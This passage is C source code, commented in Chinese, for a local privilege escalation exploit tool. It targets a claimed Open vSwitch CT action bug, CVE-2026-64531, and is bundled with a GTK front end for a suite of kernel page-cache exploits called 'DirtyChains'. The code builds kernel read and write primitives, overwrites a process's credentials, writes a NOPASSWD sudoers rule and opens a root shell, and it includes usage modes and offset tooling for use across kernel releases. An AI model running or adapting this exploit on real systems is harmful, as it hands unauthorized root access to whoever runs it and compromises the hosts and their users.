    printf("    \"" #name "\": %d,\n", k.name)

    KREC_JSON_INT(nf_conntrack_helper_me);
    KREC_JSON_INT(module_kobj_ktype);
    KREC_JSON_INT(task_pid);
    KREC_JSON_INT(task_cred);
    KREC_JSON_INT(task_pid_links);
    KREC_JSON_INT(cred_fsuid);
    KREC_JSON_INT(cred_fsgid);
    KREC_JSON_INT(cred_cap_permitted);
    KREC_JSON_INT(cred_cap_effective);
    KREC_JSON_INT(pid_namespace_idr);
    KREC_JSON_INT(idr_idr_rt);
    KREC_JSON_INT(idr_base);
    KREC_JSON_INT(xarray_xa_head);
    KREC_JSON_INT(xa_node_shift);
    KREC_JSON_INT(xa_node_slots);
    KREC_JSON_INT(pid_tasks);
    KREC_JSON_INT(hlist_head_first);
    KREC_JSON_INT(dst_entry_ref);
    KREC_JSON_INT(metadata_dst_tun_info);
    KREC_JSON_INT(ip_tunnel_key_ipv4_src);
    KREC_JSON_INT(ip_tunnel_key_ipv4_dst);
    KREC_JSON_INT(ip_tunnel_key_tos);
    KREC_JSON_INT(ip_tunnel_key_ttl);
    KREC_JSON_INT(ip_tunnel_key_tp_src);
    KREC_JSON_INT(ip_tunnel_key_tp_dst);
    KREC_JSON_INT(ovs_ct_labels);
    printf("    \"ovs_ct_action_len\": %d,\n", k.ovs_ct_action_len);
#undef KREC_JSON_INT
    printf("    \"vmlinux_module_ktype\": %lu,\n", k.vmlinux_module_ktype);
    printf("    \"vmlinux_init_pid_ns\": %lu,\n", k.vmlinux_init_pid_ns);
    printf("    \"dst_entry_ref_kind\": \"%s\"\n",
           k.ref_kind ? "__refcnt" : "__rcuref");
    printf("  },\n  \"read_carrier\": \"%s\",\n  \"write_carrier\": \"%s\",\n",
           g_dump_carrier, g_dump_wcarrier ? g_dump_wcarrier : g_dump_carrier);
    printf("  \"read_lanes\": [");
    for (i = 0; i < g_dump_lane_count; i++)
        printf("%s\"%s\"", i ? ", " : "", krec_lane_names[g_dump_lanes[i]]);
    printf("],\n  \"ovs_key_attr_tunnel_info\": %d\n}\n", g_dump_tunnel_info);

    fprintf(stderr, "\n存成 rec.json，然后：python3 tools/mk_offset.py rec.json --root offset\n"
                    "行为参数（carrier / lanes / tunnel_info）本机推导不出来，"
                    "用 -carrier / -lanes / -tunnel-info 覆盖。\n");
    return 0;
}

/* -------------------------------------------------------------------------
 * 三个模式
 * ---------------------------------------------------------------------- */

static int file_readable(const char *path)
{
    return access(path, R_OK) == 0;
}

static int do_check(void)
{
    FILE *f;
    char buf[256];
    int fails = 0;

    pr_dim("  uname: ");
    if (run_cmd("uname -a", buf, sizeof(buf)) > 0) {
        buf[strcspn(buf, "\n")] = '\0';
        pr_raw("%s\n", buf);
    }

    pr_dim("  openvswitch 模块: ");
    if (access("/sys/module/openvswitch", F_OK) == 0)
        pr_ok("已加载\n");
    else {
        pr_err("未加载\n");
        pr_dim("    先 sudo modprobe openvswitch；Ubuntu 上需要\n"
               "    linux-modules-extra-$(uname -r) 或 openvswitch 包。\n");
        fails++;
    }

    /* 先看配置表：命中的话下面三项本地推导都不需要 */
    {
        struct koffs probe;

        if (krec_resolve(&probe) != 0) {
            pr_dim("  本地推导（配置表未命中）：\n");

            pr_dim("    BTF: ");
            if (file_readable(BTF_VMLINUX))
                pr_ok("%s 可读\n", BTF_VMLINUX);
            else {
                pr_err("不可读\n");
                pr_dim("      需要 CONFIG_DEBUG_INFO_BTF；Ubuntu 20.04 的 5.4/5.8 内核\n"
                       "      多半没有，可以改装带 BTF 的 HWE 内核。\n");
                fails++;
            }

            pr_dim("    pahole: ");
            if (have_binary("pahole"))
                pr_ok("已安装\n");
            else {
                pr_err("缺失\n");
                pr_dim("      sudo apt install dwarves\n");
                fails++;
            }

            pr_dim("    符号表: ");
            {
                struct koffs k;

                if (derive_symbols(&k) == 0)
                    pr_ok("可用（module_ktype=0x%lx init_pid_ns=0x%lx 相对 _text）\n",
                          k.vmlinux_module_ktype, k.vmlinux_init_pid_ns);
                else {
                    pr_err("不可用\n");
                    pr_dim("      /proc/kallsyms 的地址被 kptr_restrict 清零时，\n"
                           "      需要 /boot/System.map-$(uname -r)（linux-image 包自带）。\n");
                    fails++;
                }
            }
        } else {
            pr_dim("  BTF / pahole / System.map: 不需要（偏移来自 %s）\n",
                   g_krec_src[0] ? g_krec_src : "配置表");
        }
    }

    pr_dim("  unprivileged_userns_clone: ");
    f = fopen("/proc/sys/kernel/unprivileged_userns_clone", "r");
    if (f) {
        if (fgets(buf, sizeof(buf), f)) {
            buf[strcspn(buf, "\n")] = '\0';
            if (!strcmp(buf, "1"))
                pr_ok("1\n");
            else {
                pr_err("%s\n", buf);
                fails++;
            }
        }
        fclose(f);
    } else {
        pr_dim("（内核没有这个开关，视为允许）\n");
    }

    pr_dim("  sudo 基线: ");
    if (sudo_works())
        pr_err("当前用户已有免密 sudo，root shell 没有对比意义\n");
    else
        pr_ok("需要密码（正常）\n");

    printf("\n");
    if (fails == 0)
        pr_ok("前置条件齐全，可以跑 -scan 或 -start。\n");
    else
        pr_err("有 %d 项不满足，直接跑会在对应步骤停下（不会破坏系统）。\n", fails);
    return fails == 0 ? 0 : 1;
}

static int do_scan(struct prim *p)
{
    uint64_t v = 0;

    pr_step("自检：读 vmlinux 里的 module_ktype");
    {
        uint64_t addr = p->kernel_base + p->k.vmlinux_module_ktype;

        if (read_kptr(&p->r, addr, "module_ktype", &v) != 0)
            return -1;
        if (v != p->module_ktype) {
            pr_err("  读回 0x%llx，与泄漏推导的 0x%llx 不一致\n",
                   (unsigned long long)v, (unsigned long long)p->module_ktype);
            return -1;
        }
        pr_ok("  读回一致: 0x%llx\n", (unsigned long long)v);
    }

    pr_step("自检：定位当前进程的 task_struct");
    {
        uint64_t task = 0;

        if (locate_task(&p->r, p->kernel_base, getpid(), &task) != 0)
            return -1;
        pr_ok("  当前 pid=%d task=0x%llx\n", getpid(), (unsigned long long)task);
    }

    printf("\n");
    pr_ok("读原语可用；写原语未执行（-scan 不会修改任何东西）。\n");
    pr_dim("    要真正提权，用 -start。\n");
    return 0;
}

static int do_start(struct prim *p, int writer_pid, int trig_fd, int ack_fd)
{
    uint64_t task = 0, cred = 0;
    char ack[600];
    int total = 0;
    ssize_t n;

    pr_step("定位 host writer 的 cred");
    if (locate_task(&p->r, p->kernel_base, writer_pid, &task) != 0)
        return -1;
    if (read_kptr(&p->r, task + (uint64_t)p->k.task_cred, "task->cred", &cred) != 0)
        return -1;
    pr_dim("  writer pid=%d task=0x%llx cred=0x%llx\n",
           writer_pid, (unsigned long long)task, (unsigned long long)cred);

    pr_step("改写 writer 的 cred");
    if (p->k.ref_kind == 0) {
        /* 新内核：dst_entry 用 __rcuref，只能一次减 1，靠次数把 fsuid 减到 0 */
        if (decrement_to_zero(&p->r, &p->w, cred + (uint64_t)p->k.cred_fsuid,
                              "fsuid") != 0)
            return -1;
        if (decrement_to_zero(&p->r, &p->w, cred + (uint64_t)p->k.cred_fsgid,
                              "fsgid") != 0)
            return -1;
    } else {
        /* 旧内核：__refcnt 是 atomic_t，0 减一次回绕成 0xffffffff */
        if (panic_on_warn()) {
            pr_err("  panic_on_warn=1，旧内核的回绕会触发 WARN 并重启；先关掉\n");
            return -1;
        }
        pr_dim("  legacy __refcnt：capability 字回绕会打一条非致命 WARN\n");
        if (zero_to_all_ones(&p->r, &p->w,
                             cred + (uint64_t)p->k.cred_cap_permitted,
                             "cap_permitted.low") != 0)
            return -1;
        if (zero_to_all_ones(&p->r, &p->w,
                             cred + (uint64_t)p->k.cred_cap_effective,
                             "cap_effective.low") != 0)
            return -1;
    }

    pr_step("让 writer 写 sudoers");
    if (write(trig_fd, "1", 1) != 1) {
        pr_err("  触发 writer 失败: %s\n", strerror(errno));
        return -1;
    }
    while (total < (int)sizeof(ack) - 1) {
        n = read(ack_fd, ack + total, sizeof(ack) - 1 - (size_t)total);
        if (n <= 0)
            break;
        total += (int)n;
    }
    ack[total] = '\0';
    close(trig_fd);
    close(ack_fd);

    if (total < 2 || ack[0] != '1') {
        pr_err("  writer 报告失败: %s", total ? ack : "(无应答)\n");
        return -1;
    }
    pr_ok("  sudoers 写入成功: %s", ack + 2);
    return 0;
}

/* -------------------------------------------------------------------------
 * 入口
 * ---------------------------------------------------------------------- */

static void banner(void)
{
    pr_raw("\n");
    if (g_color)
        fputs(C_CYA, stdout);
    pr_raw("CVE-2026-64531  Open vSwitch CT action 越界\n");
    if (g_color)
        fputs(C_RST, stdout);
    pr_dim("  ovswrap %s  ·  C 移植版\n", OVSWRAP_VERSION);
    pr_dim("  攻击链：userns+netns -> OVS datapath -> 伪造 SET action\n"
           "          -> 任意读 / dst_release 递减 -> sudoers -> sudo bash\n");
    pr_dim("  配置表：offset/<N>系/<release>/target.h，放进去就用，不用重编\n");
    pr_dim("  查找顺序：-offset <dir> / $OVSWRAP_OFFSET_DIR / <exe 目录>/offset /\n"
           "            ./offset / /usr/share/dirtychains/offset\n\n");
}

static void usage(const char *prog)
{
    banner();
    pr_raw("用法: %s <模式> [选项]\n\n", prog);
    pr_raw("模式:\n");
    pr_raw("  -check     只做前置条件检查（配置表 / 模块 / BTF / pahole / userns）\n");
    pr_raw("  -dump-krec   导出本机内核偏移记录（JSON），喂给 tools/mk_offset.py\n");
    pr_raw("  -dump-target 导出本机配置表（target.h），放进 offset/<N>系/<release>/\n");
    pr_raw("  没有 BTF 时可以用 tools/kmod 的内核模块直接读偏移（见该目录）\n");
    pr_raw("  -scan      建立读写原语并自检读一个已知地址，不修改任何东西\n");
    pr_raw("  -start     完整链：改 host writer 的 cred -> 写 sudoers -> root shell\n");
    pr_raw("  -h         帮助\n\n");
    pr_raw("选项:\n");
    pr_raw("  -t <user>  指定写入 sudoers 的 host 用户名（默认当前用户）\n");
    pr_raw("  -offset <dir>  配置表根目录（默认 ./offset、<exe 目录>/offset、\n"
           "                 /usr/share/dirtychains/offset）\n");
    pr_raw("  -krec <release>  用另一条 release 的配置（从 offset/ 里按 N系/<release> 找）\n");
    pr_raw("  -force-derive  忽略配置表，强制走 BTF / System.map 推导\n");
    pr_raw("  -carrier / -wcarrier / -lanes / -tunnel-info  "
           "配合 -dump-krec 填行为参数\n");
    pr_raw("  -from <release>  配合 -dump-krec：从 offset/ 抄一条再改成本机的\n");
    pr_raw("  -v         详细输出\n");
    pr_raw("  -nc        关闭彩色\n\n");
    pr_raw("注意:\n");
    pr_raw("  必须以普通用户运行（root 会被拒绝），且 openvswitch 模块已加载。\n");
    pr_raw("  /etc/sudoers 或 /etc/sudoers.d 会被写入一条 NOPASSWD 规则，\n");
    pr_raw("  跑完记得删掉；/etc/sudoers 如果被追加，重启前请先 visudo -c 检查。\n\n");
}

int ovswrap_main(int argc, char **argv)
{
    int mode = 0;
    const char *user_arg = NULL;
    struct host_user hu;
    struct prim p;
    char dpname[32];
    int i;

    for (i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-check"))
            mode = 1;
        else if (!strcmp(argv[i], "-scan") || !strcmp(argv[i], "-test"))
            mode = 2;
        else if (!strcmp(argv[i], "-start"))
            mode = 3;
        else if (!strcmp(argv[i], "-v"))
            g_verbose = 1;
        else if (!strcmp(argv[i], "-force-derive"))
            g_force_derive = 1;
        else if (!strcmp(argv[i], "-krec") && i + 1 < argc)
            g_krec_force = argv[++i];
        else if (!strcmp(argv[i], "-dump-krec")) {
            mode = 4;
        } else if (!strcmp(argv[i], "-dump-target")) {
            mode = 4;
            g_dump_target = 1;
        } else if (!strcmp(argv[i], "-offset") && i + 1 < argc) {
            g_offset_dir = argv[++i];
        }
        else if (!strcmp(argv[i], "-carrier") && i + 1 < argc) {
            const char *v = argv[++i];

            if (strcmp(v, "timeout") && strcmp(v, "labels-only")) {
                fprintf(stderr, "-carrier 只接受 timeout / labels-only\n");
                return 2;
            }
            g_dump_carrier = v;
            g_dump_wcarrier = v;
            g_dump_carrier_set = 1;
        } else if (!strcmp(argv[i], "-wcarrier") && i + 1 < argc) {
            const char *v = argv[++i];

            if (strcmp(v, "timeout") && strcmp(v, "labels-only")) {
                fprintf(stderr, "-wcarrier 只接受 timeout / labels-only\n");
                return 2;
            }
            g_dump_wcarrier = v;
        } else if (!strcmp(argv[i], "-lanes") && i + 1 < argc) {
            if (parse_dump_lanes(argv[++i]) != 0)
                return 2;
            g_dump_lanes_set = 1;
        } else if (!strcmp(argv[i], "-tunnel-info") && i + 1 < argc) {
            g_dump_tunnel_info = atoi(argv[++i]);
            g_dump_ti_set = 1;
        } else if (!strcmp(argv[i], "-from") && i + 1 < argc) {
            g_dump_from = argv[++i];
        }
        else if (!strcmp(argv[i], "-nc"))
            g_color = 0;
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            usage(argv[0]);
            return 0;
        } else if (!strcmp(argv[i], "-t") && i + 1 < argc) {
            user_arg = argv[++i];
        }
        /* 其它参数（比如 GUI 传进来的 -2026-64531）直接忽略 */
    }

    if (!mode) {
        usage(argv[0]);
        return 2;
    }

    if (mode == 4)
        return do_dump_krec();   /* 不打 banner，stdout 只留 JSON */

    banner();

    if (mode == 1)
        return do_check();

    if (check_launch_user(&hu) != 0)
        return 1;
    if (user_arg) {
        snprintf(hu.name, sizeof(hu.name), "%s", user_arg);
        pr_dim("  写入 sudoers 的用户: %s（命令行指定）\n", hu.name);
    } else {
        pr_dim("  写入 sudoers 的用户: %s (uid=%u)\n", hu.name, (unsigned)hu.uid);
    }

    snprintf(dpname, sizeof(dpname), "vhrd%u", (unsigned)(getpid() % 10000));

    if (mode == 2) {
        pid_t pid = fork();
        int st = 0;

        if (pid < 0) {
            pr_err("fork 失败: %s\n", strerror(errno));
            return 1;
        }
        if (pid == 0) {
            if (enter_private_ns(hu.uid, hu.gid) != 0)
                _exit(2);
            if (setup_primitives(&p, dpname, g_verbose) != 0)
                _exit(3);
            _exit(do_scan(&p) == 0 ? 0 : 4);
        }
        waitpid(pid, &st, 0);
        if (WIFEXITED(st) && WEXITSTATUS(st) == 0)
            return 0;
        if (WIFEXITED(st))
            pr_err("自检失败（阶段码 %d）\n", WEXITSTATUS(st));
        return 1;
    }

    /* -start */
    {
        char dropin[128];
        char used_user[64];
        pid_t wpid, pid;
        int trig = -1, ack = -1;
        int st = 0;

        snprintf(used_user, sizeof(used_user), "%s", hu.name);
        snprintf(dropin, sizeof(dropin), "/etc/sudoers.d/ovs_c004_%d", (int)getpid());

        wpid = fork_sudoers_writer(dropin, used_user, &trig, &ack);
        if (wpid < 0) {
            pr_err("fork sudoers writer 失败: %s\n", strerror(errno));
            return 1;
        }

        pid = fork();
        if (pid < 0) {
            pr_err("fork exploit 失败: %s\n", strerror(errno));
            return 1;
        }
        if (pid == 0) {
            int ret;

            if (enter_private_ns(hu.uid, hu.gid) != 0)
                _exit(2);
            if (setup_primitives(&p, dpname, g_verbose) != 0)
                _exit(3);
            ret = do_start(&p, (int)wpid, trig, ack);
            _exit(ret == 0 ? 0 : 4);
        }

        close(trig);
        close(ack);
        waitpid(pid, &st, 0);

        if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
            if (WIFEXITED(st))
                pr_err("利用失败（阶段码 %d）\n", WEXITSTATUS(st));
            return 1;
        }

        pr_raw("\n");
        pr_ok("提权完成。现在用 sudo -n 打开 root shell…\n");
        pr_dim("    （namespace 里的进程仍然挂着，别手动 kill 它）\n\n");
        execlp("sudo", "sudo", "-n", "bash", (char *)NULL);
        pr_err("exec sudo 失败: %s\n", strerror(errno));
        return 1;
    }
}

/* ==========================================================================
 *  第二部分：GTK3 前端
 * ==========================================================================*/
#ifndef OVSWRAP_STANDALONE

/* ============================================================================
 *  dirtyfrag-gui.c — DirtyChains 五链页缓存提权 PoC 的图形前端
 *
 *  适配 XFCE 桌面 (GTK3)。它本身不做任何内核操作, 只负责:
 *      · 拼出正确的命令行
 *      · 在伪终端 (pty) 里启动 poc, 让 poc 的彩色日志与交互式 shell 都正常
 *      · 把输出实时渲染到窗口里, 并解析 ANSI 颜色
 *      · 把输入框的内容发回 pty (提权成功后这里就是 root shell)
 *
 *  之所以用 pty 而不是普通管道: poc 的 color_enabled() 依赖 isatty(),
 *  且 43284/43494/46331 成功后会 execl 到 /bin/sh 或 su, 没有 tty 会退化。
 *
 *  编译:
 *      gcc -O2 -Wall -o dirtychains dirtyfrag-gui.c \
 *          $(pkg-config --cflags --libs gtk+-3.0) -lutil
 * ==========================================================================*/

#define _GNU_SOURCE
#include <gtk/gtk.h>
#include <gdk/gdkkeysyms.h>

#include <pty.h>
#include <utmp.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <pwd.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <limits.h>

#define APP_TITLE       "DirtyChains · 页缓存提权"
/* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
#define DF_BUILD        "2026-10-31-r14"
#define APP_SUBTITLE    "六链 PoC 图形前端 · " DF_BUILD
#define LOG_MAX_LINES   20000
#define PTY_COLS        110
#define PTY_ROWS        32
#define PATH_BUF        1024

/* ---------------------------------------------------------------------------
 * 链条描述表。顺序即下拉框顺序 (下标 0 是"全部")。
 * ------------------------------------------------------------------------ */
typedef struct {
    const char *id;      /* 传给 poc 的编号参数 */
    const char *tag;     /* 下拉框里显示的短名 */
    const char *name;    /* 全名 */
    const char *desc;    /* 说明 */
    const char *need;    /* 前提 */
    int         engine;  /* 0 = 内置 dirtychains 引擎, 1 = ovswrap 引擎 */
    const char *cls;     /* 侧栏里显示的类别名 */
} Chain;

static const Chain chains[] = {
    { "-2026-31431", "31431 · Copy Fail",
      "CVE-2026-31431  AF_ALG / AEAD",
      "splice 文件页进 AEAD, 原地解密写 4 字节",
      "需 authencesn(hmac(sha256),cbc(aes)) + algif_aead", 0,
      "AEAD类" },

    { "-2026-43284", "43284 · XFRM/ESP",
      "CVE-2026-43284  XFRM / ESP",
      "splice + esp_input 原地解密, 写 ESN 高 32 位",
      "需非特权 userns + XFRM + ESP", 0,
      "ESP类" },

    { "-2026-43500", "43500 · RxRPC",
      "CVE-2026-43500  RxRPC / RXKAD",
      "8 字节 pcbc(fcrypt) 原地解密, 改 /etc/passwd 首行",
      "需 AF_RXRPC + RXKAD, 写位置固定", 0,
      "RxRPC类" },

    { "-2026-43494", "43494 · io_uring",
      "CVE-2026-43494  io_uring + RDS",
      "页引用计数劫持, 整页替换 setuid 文件",
      "需 IORING_REGISTER_CLONE_BUFFERS (6.12+)", 0,
      "UAF类" },

    { "-2026-46331", "46331 · act_pedit",
      "CVE-2026-46331  net/sched act_pedit",
      "sendfile 进 loopback, pedit 改 TCP 头, 写穿页缓存",
      "需 act_pedit + clsact + userns", 0,
      "pedit类" },

    { "-2026-64531", "64531 · OVS CT",
      "CVE-2026-64531  net/openvswitch CT action",
      "伪造 SET action 越界读内核内存, dst_release 递减改 cred",
      "需 openvswitch + userns，偏移读 offset/ 配置表", 1,
      "OVS类" },
};
#define N_CHAINS ((int)(sizeof(chains) / sizeof(chains[0])))

/* ---------------------------------------------------------------------------
 * 应用状态
 * ------------------------------------------------------------------------ */
typedef struct {
    GtkWidget *window;
    GtkWidget *header;
    GtkWidget *btn_expand;   /* 左上角「展开」开关 */
    GtkWidget *img_expand;
    GtkWidget *lbl_expand;
    GtkWidget *revealer;     /* 展开后的左侧任务抽屉 */
    GtkWidget *task_list;    /* 抽屉里的任务列表 (GtkListBox) */
    gboolean    side_sync;   /* 列表 <-> 下拉框同步中, 防止互相触发 */
    GtkWidget *banner, *banner_lbl;
    GtkWidget *combo;
    GtkWidget *lbl_name, *lbl_desc, *lbl_need;
    GtkWidget *entry_target, *entry_to, *entry_set, *entry_offset;
    GtkWidget *chk_nobackup, *chk_verbose;
    GtkWidget *btn_check, *btn_test, *btn_lpe, *btn_write, *btn_find, *btn_stop;
    GtkWidget   *logview;
    GtkTextBuffer *logbuf;
    GtkTextMark *log_end_mark;
    GtkWidget *entry_input, *btn_send, *btn_ctrlc;
    GtkWidget *status_lbl, *spinner;

    GtkTextTag *tag_fg[8];   /* 30..37 */
    GtkTextTag *tag_bold, *tag_dim;

    /* 子进程 */
    int         master_fd;
    GPid        pid;
    guint       watch_id;
    guint       child_id;
    gboolean    running;

    /* ANSI 解析状态 */
    int         ansi_state;  /* 0 普通 / 1 ESC / 2 CSI / 3 OSC */
    GString    *csi;
    GString    *run;         /* 待插入的同色文本 */
    int         cur_fg;      /* -1 = 默认 */
    int         cur_bold, cur_dim;
    int         trim_counter;

    char       *poc_path;
    gboolean    poc_builtin; /* TRUE: 用自身内置引擎 (子进程加 --engine) */
    int         last_exit;
    gboolean    stop_requested;
    const char *action;      /* 当前动作, 用于退出码文案 */

    /* 背景图 */
    GtkWidget  *bg_area;
    GdkPixbuf  *bg_pix;
    cairo_surface_t *bg_surf;   /* 已按窗口尺寸 cover 缩放 + 白雾, 一次画好 */
    int         bg_cache_w, bg_cache_h;
    char       *bg_path;
} App;

/* ---------------------------------------------------------------------------
 * 小工具
 * ------------------------------------------------------------------------ */
static const char *user_name(void)
{
    static char buf[64];
    uid_t u = getuid();
    struct passwd *pw;

    if (buf[0])
        return buf;
    pw = getpwuid(u);
    if (pw)
        g_strlcpy(buf, pw->pw_name, sizeof(buf));
    else
        g_snprintf(buf, sizeof(buf), "uid=%u", (unsigned)u);
    return buf;
}

static const char *kernel_release(void)
{
    static char buf[128];

    struct utsname ut;

    if (buf[0])
        return buf;
    if (uname(&ut) == 0)
        g_strlcpy(buf, ut.release, sizeof(buf));
    else
        g_strlcpy(buf, "未知", sizeof(buf));
    return buf;
}

/*
 * 引擎入口: 由 Makefile 用 -Dmain=dirtychains_poc_main 把 poc 的 main 改名后
 * 链接进来, 于是本程序既是 GUI 也是 poc。
 */
extern int dirtychains_poc_main(int argc, char **argv);
int ovswrap_main(int argc, char **argv);

/*
 * 决定跑哪个引擎:
 *   --poc <路径> / DIRTYCHAINS_POC -> 外部 poc 可执行文件 (旧名 DIRTYFRAG_POC 仍认)
 *   其余情况                      -> 自身 (加 --engine 参数, 子进程 exec 自己)
 *
 * 用 "exec 自身" 而不是在 fork 出来的子进程里直接调函数: 子进程经过 exec
 * 得到干净地址空间 (不带着 GTK / glib 的线程与锁状态), 而提权成功后引擎会
 * execl("/bin/sh"), 本来也需要一个可被整体替换的进程。
 */
static char *self_exe(void)
{
    char exe[PATH_MAX];
    ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);

    if (n <= 0)
        return NULL;
    exe[n] = '\0';
    return g_strdup(exe);
}

static char *find_poc(const char *override, gboolean *builtin)
{
    const char *env = g_getenv("DIRTYCHAINS_POC");

    if (!env || !*env)                 /* 旧名，兼容 1.6 及更早的脚本 */
        env = g_getenv("DIRTYFRAG_POC");

    *builtin = FALSE;
    if (override && *override)
        return g_strdup(override);
    if (env && *env)
        return g_strdup(env);

    *builtin = TRUE;
    return self_exe();
}

/* ---------------------------------------------------------------------------
 * 背景图
 *
 * 查找顺序: --bg 参数 > DIRTYCHAINS_BG > 程序同目录 assets/bg.png > 同目录
 * bg.png > ../share/dirtychains/bg.png > 当前目录 > /usr[/local]/share。
 * 找不到就用淡蓝纯色底, 界面照常可用。
 * ------------------------------------------------------------------------ */
static char *find_bg(const char *override)
{
    static const char *sys[] = {
        "/usr/local/share/dirtychains/bg.png",
        "/usr/share/dirtychains/bg.png",
        "/usr/local/share/dirtyfrag/bg.png",
        "/usr/share/dirtyfrag/bg.png",
    };
    static const char *rel[] = { "assets/bg.png", "bg.png" };
    char exe[PATH_MAX];
    ssize_t n;
    size_t i;
    const char *env = g_getenv("DIRTYCHAINS_BG");

    if (!env || !*env)                 /* 旧名，兼容 */
        env = g_getenv("DIRTYFRAG_BG");

    if (override && *override)
        return g_strdup(override);
    if (env && *env)
        return g_strdup(env);

    n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (n > 0) {
        char *dir;

        exe[n] = '\0';
        dir = g_path_get_dirname(exe);
        for (i = 0; i < G_N_ELEMENTS(rel); i++) {
            char *c = g_build_filename(dir, rel[i], NULL);

            if (g_file_test(c, G_FILE_TEST_EXISTS)) {
                g_free(dir);
                return c;
            }
            g_free(c);
        }
        {
            char *c = g_build_filename(dir, "..", "share", "dirtychains",
                                       "bg.png", NULL);

            if (g_file_test(c, G_FILE_TEST_EXISTS)) {
                g_free(dir);
                return c;
            }
            g_free(c);
        }
        g_free(dir);
    }

    for (i = 0; i < G_N_ELEMENTS(rel); i++)
        if (g_file_test(rel[i], G_FILE_TEST_EXISTS))
            return g_strdup(rel[i]);
    for (i = 0; i < G_N_ELEMENTS(sys); i++)
        if (g_file_test(sys[i], G_FILE_TEST_EXISTS))
            return g_strdup(sys[i]);

    return NULL;
}

/*
 * 把 "cover 缩放 + 白雾" 一次性合成到一张与窗口等大的 image surface 上。
 * 这样每次 expose 只剩一次 blit, 移动/缩放窗口时不会因为实时缩放整张
 * 大图而掉帧拉出残影。
 */
static void bg_cache_rebuild(App *a, int w, int h)
{
    cairo_surface_t *surf;
    cairo_t *cr;
    int iw, ih;
    double s, dw, dh;

    if (!a->bg_pix || w < 1 || h < 1)
        return;
    if (a->bg_surf && a->bg_cache_w == w && a->bg_cache_h == h)
        return;

    if (a->bg_surf) {
        cairo_surface_destroy(a->bg_surf);
        a->bg_surf = NULL;
    }

    surf = cairo_image_surface_create(CAIRO_FORMAT_RGB24, w, h);
    if (cairo_surface_status(surf) != CAIRO_STATUS_SUCCESS) {
        cairo_surface_destroy(surf);
        return;
    }
    cr = cairo_create(surf);

    cairo_set_source_rgb(cr, 0.937, 0.957, 0.980);
    cairo_paint(cr);

    iw = gdk_pixbuf_get_width(a->bg_pix);
    ih = gdk_pixbuf_get_height(a->bg_pix);
    s = MAX((double)w / (double)iw, (double)h / (double)ih);
    dw = iw * s;
    dh = ih * s;

    cairo_save(cr);
    cairo_rectangle(cr, 0, 0, w, h);
    cairo_clip(cr);
    cairo_translate(cr, (w - dw) / 2.0, (h - dh) / 2.0);
    cairo_scale(cr, s, s);
    gdk_cairo_set_source_pixbuf(cr, a->bg_pix, 0, 0);
    cairo_pattern_set_filter(cairo_get_source(cr), CAIRO_FILTER_BILINEAR);
    cairo_paint(cr);
    cairo_restore(cr);

    /* 一层白雾: 压低图片对比度, 让压在图上的深色文字依然清楚 */
    cairo_set_source_rgba(cr, 0.98, 0.99, 1.0, 0.26);
    cairo_paint(cr);

    cairo_destroy(cr);
    a->bg_surf = surf;
    a->bg_cache_w = w;
    a->bg_cache_h = h;
}

/*
 * 窗口被拖动或改尺寸时整块重绘背景。无合成器的 X11 只重绘被标记为
 * 损坏的区域, 窗口移动过程中容易漏掉边缘, 剩下一块未定义的像素
 * (看起来就是画面被撕裂、透出桌面)。
 */
static gboolean on_configure(GtkWidget *w, GdkEventConfigure *ev, gpointer data)
{
    App *a = data;

    (void)w;
    (void)ev;
    if (a->bg_area)
        gtk_widget_queue_draw(a->bg_area);
    return FALSE;
}

/*
 * 背景层是 GtkOverlay 的底层 child (GtkDrawingArea), 界面控件压在它上面。
 * 控件都是不透明浅色, 因此不依赖合成器/窗口 alpha, 在 Xvfb、无合成器的
 * XFCE 会话里表现一致。
 */
static gboolean on_bg_draw(GtkWidget *w, cairo_t *cr, gpointer data)
{
    App *a = data;
    int ww = gtk_widget_get_allocated_width(w);
    int wh = gtk_widget_get_allocated_height(w);

    /* 兜底底色: 任何情况下窗口都不会露出后面的桌面 */
    cairo_set_source_rgb(cr, 0.937, 0.957, 0.980);
    cairo_paint(cr);
    if (!a->bg_pix)
        return FALSE;

    bg_cache_rebuild(a, ww, wh);
    if (a->bg_surf) {
        cairo_set_source_surface(cr, a->bg_surf, 0, 0);
        cairo_set_operator(cr, CAIRO_OPERATOR_SOURCE);
        cairo_paint(cr);
        cairo_set_operator(cr, CAIRO_OPERATOR_OVER);
    }
    return FALSE;
}

/* ---------------------------------------------------------------------------
 * 日志区
 * ------------------------------------------------------------------------ */
static void log_scroll_bottom(App *a)
{
    GtkTextIter end;

    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    gtk_text_buffer_move_mark(a->logbuf, a->log_end_mark, &end);
    gtk_text_view_scroll_to_mark(GTK_TEXT_VIEW(a->logview),
                                 a->log_end_mark, 0.0, TRUE, 0.0, 1.0);
}

static void log_trim(App *a)
{
    GtkTextIter start, cut;
    int lines;

    if (++a->trim_counter < 40)
        return;
    a->trim_counter = 0;

    lines = gtk_text_buffer_get_line_count(a->logbuf);
    if (lines <= LOG_MAX_LINES)
        return;

    gtk_text_buffer_get_start_iter(a->logbuf, &start);
    cut = start;
    gtk_text_iter_forward_lines(&cut, lines - LOG_MAX_LINES);
    gtk_text_buffer_delete(a->logbuf, &start, &cut);
}

/* 把 run 缓冲区按当前颜色插入 */
static void log_flush(App *a)
{
    GtkTextIter end;
    GtkTextTag *tags[4];
    int nt = 0;

    if (!a->run || a->run->len == 0)
        return;

    if (a->cur_fg >= 0 && a->tag_fg[a->cur_fg])
        tags[nt++] = a->tag_fg[a->cur_fg];
    if (a->cur_bold)
        tags[nt++] = a->tag_bold;
    if (a->cur_dim)
        tags[nt++] = a->tag_dim;

    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    if (nt == 0) {
        gtk_text_buffer_insert(a->logbuf, &end, a->run->str, (gint)a->run->len);
    } else {
        tags[nt] = NULL;
        gtk_text_buffer_insert_with_tags(a->logbuf, &end, a->run->str,
                                         (gint)a->run->len,
                                         tags[0],
                                         nt > 1 ? tags[1] : NULL,
                                         nt > 2 ? tags[2] : NULL,
                                         NULL);
    }
